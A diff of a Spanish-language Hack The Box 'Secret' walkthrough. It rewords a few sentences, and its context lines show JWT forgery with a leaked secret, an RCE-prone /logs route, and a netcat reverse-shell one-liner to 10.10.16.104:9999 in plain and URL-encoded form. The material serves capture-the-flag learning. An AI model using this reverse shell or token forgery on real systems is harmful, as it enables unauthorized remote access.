@@ -386,7 +386,7 @@ const jwt = require("jsonwebtoken");
 Según este script de verificación, nuestro token debe estar firmado con el **`TOKEN_SECRET`** que encontramos anteriormente.
 Podemos hacer todo esto en la página **https://jwt.io/**
 <br/>
-Veamos cómo está construido nuestro JWT (algo que ya vimos en el ejemplo del apartado **`Login User`** en la documentación de la web).
+Veamos cómo está construido nuestro JWT (algo que ya vimos en la documentación de la web).
 
 ![JSON Web Token](/assets/images/hackthebox/secret/jwt_token.png)
 
@@ -409,9 +409,9 @@ p3ntest1ng:~$ curl -s -X GET "http://secret.htb:3000/api/priv" \
 }
 ```
 
-Perfecto, el sistema nos reconoce como administrador. Ahora vamos a analizar otro JavaScript, el archivo **`private.js`**
+Perfecto, el sistema nos reconoce como administrador. Vamos a analizar otro JavaScript, el archivo **`private.js`**
 <br/>
-Si nos fijamos en esta parte, vemos que la ruta **`/logs`** es vulnerable a [Remote Code Execution (RCE)](https://beaglesecurity.com/blog/vulnerability/remote-code-execution.html):
+Si nos fijamos en esta parte, vemos que la ruta **`/logs`** es vulnerable a [Remote Code Execution](https://beaglesecurity.com/blog/vulnerability/remote-code-execution.html):
 
 ```javascript
 ...[snip]...
@@ -451,7 +451,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.104 9999 >/tmp/f
 ```
 
 Primero vamos a "encodearlo" para evitar posibles problemas utilizando la web **https://www.urlencoder.io/**
-> **NOTA:** Se puede también como base64, no hay problema, yo lo he hecho así porque quería hacerlo de otro modo distinto a lo habitual.
+> **NOTA:** También podrías ponerlo como base64, no hay problema, yo lo he hecho así porque quería hacerlo de otro modo distinto a lo habitual.
 
 ```bash
 rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.16.104%209999%20%3E%2Ftmp%2Ff
@@ -733,6 +733,6 @@ Y eso sería todo, espero que os haya gustado y como siempre:
 
 ### ¡Gracias por leer hasta el final!
 
-De esta máquina me ha gustado la progresión y la escalada de privilegios, ya que es algo que no había visto anteriormente y me ha servido para aprender sobre el Core Dump de binarios, algo muy interesante.
+De esta máquina me ha gustado la progresión y la escalada de privilegios, ya que es algo que no había visto anteriormente y me ha servido para aprender sobre el Core Dump de binarios.
 
 #### Nos vemos en un próximo. ¡Feliz hacking! ☠
